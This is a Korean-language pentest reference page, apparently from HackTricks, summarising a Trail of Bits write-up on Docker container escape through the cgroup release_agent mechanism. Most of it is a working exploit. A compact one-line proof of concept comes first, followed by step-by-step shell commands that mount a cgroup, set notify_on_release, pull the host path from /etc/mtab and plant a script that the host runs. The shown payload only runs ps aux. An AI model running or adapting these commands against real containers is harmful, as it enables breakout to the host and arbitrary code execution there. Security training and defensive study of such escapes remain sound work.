# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**자세한 내용은** [**원본 블로그 게시물**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**을 참조하십시오.** 이것은 요약입니다:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
개념 증명(Proof of Concept, PoC)은 `release_agent` 파일을 생성하고 이를 호출하여 컨테이너 호스트에서 임의의 명령을 실행하는 방법을 보여줍니다. 다음은 관련 단계의 요약입니다:

1. **환경 준비:**
- `/tmp/cgrp` 디렉토리가 cgroup의 마운트 지점으로 사용되도록 생성됩니다.
- RDMA cgroup 컨트롤러가 이 디렉토리에 마운트됩니다. RDMA 컨트롤러가 없는 경우, `memory` cgroup 컨트롤러를 대안으로 사용하는 것이 좋습니다.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **자식 Cgroup 설정:**
- 마운트된 cgroup 디렉토리 내에 "x"라는 이름의 자식 cgroup이 생성됩니다.
- "x" cgroup에 대해 notify_on_release 파일에 1을 작성하여 알림이 활성화됩니다.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **릴리스 에이전트 구성:**
- 호스트의 컨테이너 경로는 /etc/mtab 파일에서 가져옵니다.
- 그런 다음 cgroup의 release_agent 파일을 구성하여 획득한 호스트 경로에 위치한 /cmd라는 스크립트를 실행합니다.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd 스크립트 생성 및 구성:**
- /cmd 스크립트는 컨테이너 내에서 생성되며 ps aux를 실행하도록 구성되어 있으며, 출력은 컨테이너 내의 /output이라는 파일로 리디렉션됩니다. 호스트에서 /output의 전체 경로가 지정됩니다.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **공격 시작:**
- "x" 자식 cgroup 내에서 프로세스가 시작되고 즉시 종료됩니다.
- 이로 인해 `release_agent`(the /cmd script)가 트리거되어 호스트에서 ps aux를 실행하고 출력을 컨테이너 내의 /output에 기록합니다.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
